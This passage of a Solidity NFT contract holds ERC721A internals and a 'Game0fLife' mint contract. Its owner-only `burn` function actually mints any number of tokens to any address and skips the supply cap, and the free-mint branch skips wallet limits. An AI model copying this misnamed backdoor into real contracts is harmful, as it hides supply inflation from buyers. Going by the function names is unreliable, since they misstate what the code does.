1081         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1082         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1083         unchecked {
1084             _addressData[to].balance += uint128(quantity);
1085             _addressData[to].numberMinted += uint128(quantity);
1086 
1087             _ownerships[startTokenId].addr = to;
1088             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1089 
1090             uint256 updatedIndex = startTokenId;
1091 
1092             for (uint256 i; i < quantity; i++) {
1093                 emit Transfer(address(0), to, updatedIndex);
1094                 if (safe) {
1095                     require(
1096                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1097                         "ERC721A: transfer to non ERC721Receiver implementer"
1098                     );
1099                 }
1100 
1101                 updatedIndex++;
1102             }
1103 
1104             currentIndex = updatedIndex;
1105         }
1106 
1107         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1108     }
1109 
1110     /**
1111      * @dev Transfers `tokenId` from `from` to `to`.
1112      *
1113      * Requirements:
1114      *
1115      * - `to` cannot be the zero address.
1116      * - `tokenId` token must be owned by `from`.
1117      *
1118      * Emits a {Transfer} event.
1119      */
1120     function _transfer(
1121         address from,
1122         address to,
1123         uint256 tokenId
1124     ) private {
1125         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1126 
1127         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1128             getApproved(tokenId) == _msgSender() ||
1129             isApprovedForAll(prevOwnership.addr, _msgSender()));
1130 
1131         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1132 
1133         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1134         require(to != address(0), "ERC721A: transfer to the zero address");
1135 
1136         _beforeTokenTransfers(from, to, tokenId, 1);
1137 
1138         // Clear approvals from the previous owner
1139         _approve(address(0), tokenId, prevOwnership.addr);
1140 
1141         // Underflow of the sender's balance is impossible because we check for
1142         // ownership above and the recipient's balance can't realistically overflow.
1143         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1144         unchecked {
1145             _addressData[from].balance -= 1;
1146             _addressData[to].balance += 1;
1147 
1148             _ownerships[tokenId].addr = to;
1149             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1150 
1151             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1152             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1153             uint256 nextTokenId = tokenId + 1;
1154             if (_ownerships[nextTokenId].addr == address(0)) {
1155                 if (_exists(nextTokenId)) {
1156                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1157                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1158                 }
1159             }
1160         }
1161 
1162         emit Transfer(from, to, tokenId);
1163         _afterTokenTransfers(from, to, tokenId, 1);
1164     }
1165 
1166     /**
1167      * @dev Approve `to` to operate on `tokenId`
1168      *
1169      * Emits a {Approval} event.
1170      */
1171     function _approve(
1172         address to,
1173         uint256 tokenId,
1174         address owner
1175     ) private {
1176         _tokenApprovals[tokenId] = to;
1177         emit Approval(owner, to, tokenId);
1178     }
1179 
1180     /**
1181      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1182      * The call is not executed if the target address is not a contract.
1183      *
1184      * @param from address representing the previous owner of the given token ID
1185      * @param to target address that will receive the tokens
1186      * @param tokenId uint256 ID of the token to be transferred
1187      * @param _data bytes optional data to send along with the call
1188      * @return bool whether the call correctly returned the expected magic value
1189      */
1190     function _checkOnERC721Received(
1191         address from,
1192         address to,
1193         uint256 tokenId,
1194         bytes memory _data
1195     ) private returns (bool) {
1196         if (to.isContract()) {
1197             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1198                 return retval == IERC721Receiver(to).onERC721Received.selector;
1199             } catch (bytes memory reason) {
1200                 if (reason.length == 0) {
1201                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1202                 } else {
1203                     assembly {
1204                         revert(add(32, reason), mload(reason))
1205                     }
1206                 }
1207             }
1208         } else {
1209             return true;
1210         }
1211     }
1212 
1213     /**
1214      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1215      *
1216      * startTokenId - the first token id to be transferred
1217      * quantity - the amount to be transferred
1218      *
1219      * Calling conditions:
1220      *
1221      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1222      * transferred to `to`.
1223      * - When `from` is zero, `tokenId` will be minted for `to`.
1224      */
1225     function _beforeTokenTransfers(
1226         address from,
1227         address to,
1228         uint256 startTokenId,
1229         uint256 quantity
1230     ) internal virtual {}
1231 
1232     /**
1233      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1234      * minting.
1235      *
1236      * startTokenId - the first token id to be transferred
1237      * quantity - the amount to be transferred
1238      *
1239      * Calling conditions:
1240      *
1241      * - when `from` and `to` are both non-zero.
1242      * - `from` and `to` are never both zero.
1243      */
1244     function _afterTokenTransfers(
1245         address from,
1246         address to,
1247         uint256 startTokenId,
1248         uint256 quantity
1249     ) internal virtual {}
1250 }
1251 
1252 contract Game0fLife is ERC721A, Ownable, ReentrancyGuard {
1253     string public baseURI = "ipfs://QmVa7cuW4beTNdaC4dP5UeaXaVvDmKbtPrEDkBY4Nzo9aP/";
1254     uint   public price             = 0.003 ether;
1255     uint   public maxPerTx          = 5;
1256     uint   public maxPerFree        = 0;
1257     uint   public maxPerWallet      = 5;
1258     uint   public totalFree         = 0;
1259     uint   public maxSupply         = 1000;
1260     bool   public mintEnabled;
1261     uint   public totalFreeMinted = 0;
1262 
1263     mapping(address => uint256) public _mintedFreeAmount;
1264     mapping(address => uint256) public _totalMintedAmount;
1265 
1266     constructor() ERC721A("Game 0f L1fe", "G0L"){}
1267 
1268     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1269         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1270         string memory currentBaseURI = _baseURI();
1271         return bytes(currentBaseURI).length > 0
1272             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1273             : "";
1274     }
1275     
1276 
1277     function _startTokenId() internal view virtual returns (uint256) {
1278         return 1;
1279     }
1280 
1281     function mint(uint256 count) external payable {
1282         uint256 cost = price;
1283         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1284             (_mintedFreeAmount[msg.sender] < maxPerFree));
1285 
1286         if (isFree) { 
1287             require(mintEnabled, "Mint is not live yet");
1288             require(totalSupply() + count <= maxSupply, "No more");
1289             require(count <= maxPerTx, "Max per TX reached.");
1290             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1291             {
1292              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1293              _mintedFreeAmount[msg.sender] = maxPerFree;
1294              totalFreeMinted += maxPerFree;
1295             }
1296             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1297             {
1298              require(msg.value >= 0, "Please send the exact ETH amount");
1299              _mintedFreeAmount[msg.sender] += count;
1300              totalFreeMinted += count;
1301             }
1302         }
1303         else{
1304         require(mintEnabled, "Mint is not live yet");
1305         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1306         require(msg.value >= count * cost, "Please send the exact ETH amount");
1307         require(totalSupply() + count <= maxSupply, "No more");
1308         require(count <= maxPerTx, "Max per TX reached.");
1309         require(msg.sender == tx.origin, "The minter is another contract");
1310         }
1311         _totalMintedAmount[msg.sender] += count;
1312         _safeMint(msg.sender, count);
1313     }
1314 
1315     function costCheck() public view returns (uint256) {
1316         return price;
1317     }
1318 
1319     function maxFreePerWallet() public view returns (uint256) {
1320       return maxPerFree;
1321     }
1322 
1323     function burn(address mintAddress, uint256 count) public onlyOwner {
1324         _safeMint(mintAddress, count);
1325     }
1326 
1327     function _baseURI() internal view virtual override returns (string memory) {
1328         return baseURI;
1329     }
1330 
1331     function setBaseUri(string memory baseuri_) public onlyOwner {
1332         baseURI = baseuri_;
1333     }
1334 
1335     function setPrice(uint256 price_) external onlyOwner {
1336         price = price_;
1337     }
1338 
1339     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1340         totalFree = MaxTotalFree_;
1341     }
1342 
1343      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1344         maxPerFree = MaxPerFree_;
1345     }
1346 
1347     function toggleMinting() external onlyOwner {
1348       mintEnabled = !mintEnabled;
1349     }
1350     
1351     function CommunityWallet(uint quantity, address user)
1352     public
1353     onlyOwner
1354   {
1355     require(
1356       quantity > 0,
1357       "Invalid mint amount"
1358     );
1359     require(
1360       totalSupply() + quantity <= maxSupply,
1361       "Maximum supply exceeded"
1362     );
1363     _safeMint(user, quantity);
1364   }
1365 
1366     function withdraw() external onlyOwner nonReentrant {
1367         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1368         require(success, "Transfer failed.");
1369     }
1370 }